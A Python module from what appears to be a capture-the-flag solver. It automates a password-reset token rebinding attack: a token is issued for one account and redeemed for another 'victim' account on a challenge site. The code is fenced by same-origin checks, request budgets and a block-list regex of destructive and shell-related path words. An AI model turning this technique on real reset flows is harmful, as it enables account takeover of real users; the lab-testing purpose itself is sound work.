#!/usr/bin/env python3
"""Bounded, clue-driven reset-token rebinding for the web lane.

This is the narrow Day-17 shape, not a generic account-takeover fuzzer.  The
target must publish a recovery guide containing two same-origin GET routes,
the exact account/token parameter names, and exactly one self-service account
plus exactly one non-self-service account.  The solver requests one token for
the former and redeems it exactly once for the latter.  It never retries or
enumerates accounts, never follows an off-host route, and never submits.

Only one novel lowercase ``proof_`` + 32-hex value from the successful victim
redeem is returned.  Other target-authored proof/evidence values are surfaced
through ``ctx['evidence']`` but are never auto-returned.
"""

from __future__ import annotations

import datetime as _dt
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402
import security_json as _security_json  # noqa: E402 -- fail-closed policy JSON

try:
    import forge_event as _proofs  # noqa: E402
except Exception:
    _proofs = None

BASELINE_INCOMPLETE = getattr(
    _proofs, "BASELINE_STRICT_INCOMPLETE",
    "<!-- huntress-baseline-strict-set:incomplete -->",
)


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 30.0
DEFAULT_MAX_REQUESTS = 8
DEADLINE_PAD = 0.3
PAIR_REDEEM_RESERVE = 0.5
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
_PARAM = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_TOKEN = re.compile(r"^[A-Za-z0-9._~-]{3,256}$")
_BLOCKED_PATH = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|destroy|drop|wipe|purge|remove|truncate|erase|revoke|logout|"
    r"signout|disable|deactivate|uninstall|kill|shutdown|restart|reboot|ban|suspend|cancel|"
    r"transfer|pay|purchase|refund|approve|reject|create|insert|update|edit|write|save|upload|"
    r"import|execute|exec|run|cmd|command|shell|eval|login|signin|register|signup)"
    r"(?=$|[/_.-]|\d)"
)


def enabled() -> bool:
    """Default-on after the player's 2026-10-26 request for maximum web coverage."""
    raw = ctf_env.get("CTF_WEB_RESET_REBIND")
    if raw is not None:
        return raw.strip().lower() in ("on", "1", "true", "yes")
    try:
        root = ctf_paths.workdir()
        if (root / "_reset_rebind.off").exists():
            return False
        if (root / "_reset_rebind.on").exists():
            return True
    except Exception:
        return False
    return True


def _text(response) -> str:
    if not isinstance(response, dict):
        return ""
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response)
            return str(views[0])[:MAX_TEXT] if views else ""
        except Exception:
            return ""
    value = response.get("body", response.get("text", ""))
    if isinstance(value, (bytes, bytearray)):
        return bytes(value[:MAX_TEXT]).decode("utf-8", "replace")
    return str(value or "")[:MAX_TEXT]


def _baseline_text(response) -> str:
    if _proofs is not None and hasattr(_proofs, "response_baseline_text"):
        return _proofs.response_baseline_text(response)
    text = _text(response)
    raw = response.get("response_headers", response.get("headers", {})) if isinstance(response, dict) else {}
    headers = "\n".join(str(value)[:4096] for value in raw.values()) if isinstance(raw, dict) else ""
    return (text + ("\n" + headers if headers else ""))[:MAX_TEXT]


def _json(response):
    views = None
    if _proofs is not None and hasattr(_proofs, "response_text_views"):
        try:
            views = _proofs.response_text_views(response)
        except Exception:
            return None
    try:
        value = _security_json.loads_unique(
            views if views is not None else [_text(response)], max_chars=MAX_TEXT)
        return value if isinstance(value, dict) else None
    except Exception:
        return None


def _coherent_json_view(response, expected):
    """The one carrier view that produced ``expected``, plus all siblings.

    A successful recovery JSON member may authorize the one-shot result, but
    it cannot bless a proof printed in a different MIME/archive/header view.
    """
    if _proofs is None or not hasattr(_proofs, "response_text_views"):
        text = _text(response)
        return (text, []) if text else (None, [])
    try:
        views = list(_proofs.response_text_views(response, strict=True))[:256]
    except Exception:
        return None, []
    matches = []
    for view in views:
        try:
            parsed = _security_json.loads(str(view), max_chars=MAX_TEXT)
        except Exception:
            continue
        if isinstance(parsed, dict) and parsed == expected:
            matches.append(str(view))
    if len(matches) != 1:
        return None, views
    anchor = matches[0]
    siblings = [str(view) for view in views if str(view) != anchor]
    raw_headers = response.get("response_header_pairs") if isinstance(response, dict) else None
    if isinstance(raw_headers, (list, tuple)):
        siblings += [str(row[1]) for row in raw_headers
                     if isinstance(row, (list, tuple)) and len(row) == 2]
    elif isinstance(response, dict):
        headers = response.get("response_headers", response.get("headers", {}))
        if isinstance(headers, dict):
            siblings += [str(value) for value in headers.values()]
    return anchor, siblings


def _carrier_candidates(values):
    out = []
    if _proofs is None or not hasattr(_proofs, "_candidate_values"):
        return out
    for value in list(values or [])[:512]:
        try:
            found = _proofs._candidate_values(str(value), text_limit=MAX_TEXT, max_values=24)
        except Exception:
            found = []
        for candidate in found:
            if candidate not in out:
                out.append(candidate)
    return out[:24]


def _view_response(response, view):
    out = dict(response or {})
    out["body"] = str(view).encode("utf-8", "strict")
    out["response_headers"] = {"Content-Type": "application/json"}
    out.pop("response_header_pairs", None)
    out.pop("headers", None)
    return out


def _ok(response) -> bool:
    return (isinstance(response, dict) and isinstance(response.get("status"), int)
            and 200 <= response["status"] < 300)


def _truth(value) -> bool:
    return value is True or value == 1 or (isinstance(value, str) and value.strip().lower() in
                                           ("true", "yes", "ok", "success"))


def _same_scalar(a, b) -> bool:
    if isinstance(a, bool) or isinstance(b, bool):
        return False
    return isinstance(a, (str, int)) and isinstance(b, (str, int)) and str(a) == str(b)


def _route(value, base_url, *, allow_query=False):
    """Return a normalized same-origin route or ``None`` (query-free by default).

    Recovery routes are executable contracts: target-authored query strings
    must not smuggle an additional URL/action alongside the two exact values
    this helper appends itself. ``allow_query`` is used only for those locally
    constructed issue/redeem requests after the advertised paths were checked.
    """
    try:
        result = _web.safe_same_origin_route(
            value, base_url, allow_query=allow_query,
            guard_query=not allow_query, max_bytes=MAX_ROUTE_BYTES)
        if result is None:
            return None
        path = urllib.parse.urlsplit(result).path or "/"
        for decoded in _web.canonical_route_layers(path, max_bytes=MAX_ROUTE_BYTES) or ():
            camel = re.sub(r"([a-z0-9])([A-Z])", r"\1/\2", decoded)
            if (_BLOCKED_PATH.search(decoded) or _BLOCKED_PATH.search(camel)
                    or _web.route_has_destructive_action(
                        decoded,
                        allowed_actions=("reset", "issue", "redeem"))):
                return None
        return result
    except Exception:
        return None


def _with_query(route, values):
    parts = urllib.parse.urlsplit(route)
    current = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    current += [(str(k), str(v)) for k, v in values]
    return urllib.parse.urlunsplit(("", "", parts.path, urllib.parse.urlencode(current), ""))


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode()
        return out
    return None


def _origin(value):
    try:
        parts = urllib.parse.urlsplit(str(value or ""))
        if (parts.scheme not in ("http", "https") or not parts.hostname
                or parts.username is not None or parts.password is not None
                or parts.fragment or "@" in parts.netloc):
            return None
        return parts.scheme, parts.hostname.lower(), parts.port or (443 if parts.scheme == "https" else 80)
    except Exception:
        return None


class _ResetRebind:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None \
                else time.time() + DEFAULT_SECONDS
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.requests = 0
        self.issue_requests = 0
        self.redeem_requests = 0
        supplied_baselines = list(self.ctx.get("baseline_texts") or [])
        self.baselines = [str(x or "")[:MAX_TEXT] for x in supplied_baselines[:40]]
        if len(supplied_baselines) > 40 and BASELINE_INCOMPLETE not in self.baselines:
            self.baselines.append(BASELINE_INCOMPLETE)
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        self.responses = []
        self.candidates = []
        self.success = False
        self.where = None
        self.stopped = None
        self.t0 = time.time()
        self._gate = threading.Lock()
        self._stopped = False
        try:
            if self.ctx.get("client") is not None:
                candidate = self.ctx["client"]
                client_origin = _origin(getattr(candidate, "base", None))
                target_origin = _origin(self.url)
                self.client = candidate if (client_origin is not None and target_origin is not None
                                            and client_origin == target_origin) else None
                if self.client is None:
                    self.stopped = "client scope mismatch"
            elif callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
                client_origin = _origin(getattr(candidate, "base", None))
                target_origin = _origin(self.url)
                self.client = candidate if (client_origin is not None and target_origin is not None
                                            and client_origin == target_origin) else None
                if self.client is None:
                    self.stopped = "client scope mismatch"
            else:
                self.client = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
        except Exception as exc:
            self.client = None
            self.stopped = f"no scoped client: {type(exc).__name__}"

    def _may_send(self):
        if self._stopped or (hasattr(self.external_stop, "is_set") and self.external_stop.is_set()):
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.deadline is not None and self.deadline - time.time() <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def stop_now(self):
        with self._gate:
            self._stopped = True

    def _can_complete_pair(self):
        """The one-shot issue is allowed only when its redeem slot exists."""
        with self._gate:
            if self.client is None or not self._may_send():
                return False
            if self.requests + 2 > self.max_requests:
                self.stopped = self.stopped or "insufficient request budget for issue/redeem pair"
                return False
            if (self.deadline is not None
                    and self.deadline - time.time() <= DEADLINE_PAD + PAIR_REDEEM_RESERVE):
                self.stopped = self.stopped or "insufficient time for issue/redeem pair"
                return False
            return True

    def request(self, path, role, *, baseline=False, reserve_after=0.0):
        # Only these two paths contain query data, and it was constructed by
        # _with_query after their advertised route passed the query-free
        # contract above.  No target-authored route reaches this exception.
        path = _route(path, self.url, allow_query=role in ("issue", "redeem"))
        if path is None:
            self.stopped = self.stopped or "refused unsafe/oversized route"
            return None
        cached = self.preloaded.get(path)
        if cached is not None and role in ("landing", "clues"):
            response = _response(cached)
            if response is not None and baseline:
                self.baselines.append(_baseline_text(response))
            return response
        with self._gate:
            if self.client is None or not self._may_send():
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                self.client.timeout = REQUEST_TIMEOUT if left is None else max(
                    0.2, min(REQUEST_TIMEOUT, left - 0.1 - max(0.0, float(reserve_after))))
            except Exception:
                pass
            self.requests += 1
            if role == "issue":
                self.issue_requests += 1
            elif role == "redeem":
                self.redeem_requests += 1
            try:
                response = self.client.request("GET", path, allow_redirects=False)
            except Exception as exc:
                self.responses.append({"role": role, "path": path.split("?", 1)[0], "status": None,
                                       "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
        self.responses.append({"role": role, "path": path.split("?", 1)[0],
                               "status": response.get("status") if isinstance(response, dict) else None})
        if response is not None and baseline:
            self.baselines.append(_baseline_text(response))
        return response

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        if self.client is None or self.max_requests <= 0 or _proofs is None:
            self.stopped = self.stopped or "unavailable"
            return None
        landing = self.request("/", "landing", baseline=True)
        if isinstance(landing, dict) and landing.get("status") == 410:
            self.stopped = "completed"
            return None
        clues_r = self.request("/api/clues", "clues", baseline=True)
        clues = _json(clues_r)
        if not _ok(clues_r) or not isinstance(clues, dict):
            self.stopped = "no clue document"
            return None
        guide_route = _route(clues.get("recovery_guide_route"), self.url)
        if not guide_route:
            self.stopped = "not a self-described recovery flow"
            return None
        guide_r = self.request(guide_route, "guide", baseline=True)
        guide = _json(guide_r)
        if not _ok(guide_r) or not isinstance(guide, dict):
            self.stopped = "invalid recovery guide"
            return None

        request_route = _route(guide.get("request_route"), self.url)
        redeem_route = _route(guide.get("redeem_route"), self.url)
        account_param = guide.get("account_parameter")
        token_param = guide.get("token_parameter")
        accounts = guide.get("accounts")
        if (not request_route or not redeem_route or request_route == redeem_route
                or not isinstance(account_param, str) or not _PARAM.fullmatch(account_param)
                or not isinstance(token_param, str) or not _PARAM.fullmatch(token_param)
                or account_param == token_param or not isinstance(accounts, list)):
            self.stopped = "incomplete recovery contract"
            return None
        # If clues echo the two routes, disagreement is ambiguity, never permission to choose one.
        for clue_key, advertised in (("feature_route", request_route), ("secondary_route", redeem_route)):
            if clue_key in clues and _route(clues.get(clue_key), self.url) != advertised:
                self.stopped = "recovery route disagreement"
                return None

        # Completeness is part of the authorization contract. Do not select a
        # convenient pair from a longer or partly malformed list.
        if len(accounts) != 2:
            self.stopped = "recovery accounts are not an exact pair"
            return None
        sources, victims = [], []
        for account in accounts:
            if (not isinstance(account, dict) or "id" not in account or
                    not isinstance(account.get("self_service"), bool)):
                self.stopped = "malformed recovery account"
                return None
            ident = account.get("id")
            if isinstance(ident, bool) or not isinstance(ident, (str, int)) or not 1 <= len(str(ident)) <= 128:
                self.stopped = "malformed recovery account"
                return None
            (sources if account.get("self_service") is True else victims).append(ident)
        if len(sources) != 1 or len(victims) != 1 or _same_scalar(sources[0], victims[0]):
            self.stopped = "recovery accounts are not uniquely determined"
            return None
        source, victim = sources[0], victims[0]

        # The issue endpoint is one-shot.  Before asking it for a token, prove
        # that every token form this reader is willing to accept still fits in
        # the advertised redeem route.  Otherwise a long route can consume the
        # token and only then fail the final URL guard.
        largest_redeem = _with_query(
            redeem_route, [(account_param, victim), (token_param, "X" * 256)])
        if _route(largest_redeem, self.url, allow_query=True) is None:
            self.stopped = "redeem route cannot hold the allowed token contract"
            return None
        if not self._can_complete_pair():
            return None
        issue_path = _with_query(request_route, [(account_param, source)])
        issue_r = self.request(issue_path, "issue", baseline=True,
                               reserve_after=PAIR_REDEEM_RESERVE)
        issue = _json(issue_r)
        if (not _ok(issue_r) or not isinstance(issue, dict) or not _truth(issue.get("ok"))
                or not _same_scalar(issue.get(account_param), source)):
            self.stopped = "token issue was not confirmed"
            return None
        token = issue.get(token_param)
        if (isinstance(token, bool) or not isinstance(token, (str, int))
                or not _TOKEN.fullmatch(str(token))):
            self.stopped = "issued token missing or unsafe"
            return None
        if "redeem_route" in issue and _route(issue.get("redeem_route"), self.url) != redeem_route:
            self.stopped = "issued redeem route disagrees"
            return None

        # One-shot boundary: exactly one cross-account redeem and never a control/retry.
        redeem_path = _with_query(redeem_route, [(account_param, victim), (token_param, token)])
        redeem_r = self.request(redeem_path, "redeem", baseline=False)
        redeem = _json(redeem_r)
        if (not _ok(redeem_r) or not isinstance(redeem, dict) or not _truth(redeem.get("ok"))
                or not _same_scalar(redeem.get(account_param), victim)):
            self.stopped = "victim redeem was not confirmed"
            return None
        effect = str(redeem.get("effect") or "").strip().lower()
        if effect != "synthetic_account_recovery":
            self.stopped = "victim recovery effect missing"
            return None
        anchor_view, sibling_views = _coherent_json_view(redeem_r, redeem)
        if anchor_view is None:
            self.stopped = "recovery effect had no coherent carrier view"
            return None
        sibling_candidates = _carrier_candidates(sibling_views)
        info = _proofs.extract_success(_view_response(redeem_r, anchor_view), self.baselines,
                                       host=urllib.parse.urlsplit(self.url).hostname)
        self.candidates = list(dict.fromkeys(
            list(info.get("candidates") or []) + sibling_candidates))
        if info.get("auto") is None:
            self.candidates += [x for x in info.get("wire") or [] if x not in self.candidates]
        self.success = bool(info.get("success"))
        self.where = "reset-token-rebind"
        if not self.success:
            self.stopped = "redeem response lacked a success anchor"
            return None
        if info.get("auto") and not sibling_candidates:
            return info["auto"]
        if sibling_candidates:
            self.stopped = "recovery success and proof/candidate occupied different carrier views"
            return None
        self.stopped = "recovery succeeded; candidate surfaced"
        return None

    def summary(self, proof):
        return {"proof": proof, "success": self.success, "candidates": list(dict.fromkeys(self.candidates))[:12],
                "baseline_proofs": (_proofs.baseline_proofs(self.baselines)
                                    if _proofs is not None and hasattr(_proofs, "baseline_proofs") else []),
                "requests": self.requests, "issue_requests": self.issue_requests,
                "redeem_requests": self.redeem_requests, "seconds": round(time.time() - self.t0, 3),
                "where": self.where, "stopped": self.stopped, "responses": self.responses[:12]}


def _surface(ctx, aid, values):
    evidence = ctx.get("evidence")
    for value in list(dict.fromkeys(str(x)[:256] for x in values))[:6]:
        line = _web.safe_display_text(
            f"WEB RESET CANDIDATE {aid}: {value} (successful response; not auto-submitted)", 600)
        if isinstance(evidence, list) and line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises and never submits."""
    ctx = dict(ctx or {})
    runner = _ResetRebind(target, ctx)
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
        proof = None
    finally:
        runner.stop_now()
    aid = runner.target.get("answer_id") or "target"
    _surface(ctx, aid, runner.candidates)
    summary = runner.summary(proof)
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    """Run targets concurrently behind one shared deadline; mirrors proof_hunt's contract."""
    ctx = dict(ctx or {})
    try:
        valid = [dict(t) for t in list(targets or [])
                 if isinstance(t, dict) and t.get("answer_id") and t.get("url")]
    except Exception:
        return {}
    out, runners = {}, {}
    lock = threading.Lock()

    def one(target):
        runner = _ResetRebind(target, ctx)
        with lock:
            runners[target["answer_id"]] = runner
        try:
            value = runner.run()
        except Exception as exc:
            runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
            value = None
        with lock:
            out[target["answer_id"]] = value

    threads = [threading.Thread(target=one, args=(t,), name=f"reset-rebind-{t['answer_id']}", daemon=True)
               for t in valid]
    for thread in threads:
        thread.start()
    deadline = ctx.get("deadline")
    for thread in threads:
        try:
            timeout = None if deadline is None else max(0.0, float(deadline) - time.time())
        except (TypeError, ValueError):
            timeout = None
        thread.join(timeout=timeout)
    for runner in list(runners.values()):
        runner.stop_now()
    for thread in threads:
        thread.join(timeout=REQUEST_TIMEOUT + 0.5)
    sink = ctx.get("result_sink")
    for target in valid:
        aid = target["answer_id"]
        out.setdefault(aid, None)
        summary = runners[aid].summary(out[aid]) if aid in runners else {"proof": None, "stopped": "no result"}
        if isinstance(sink, dict):
            sink[aid] = summary
        _surface(ctx, aid, summary.get("candidates") or [])
        _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "reset_rebind.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
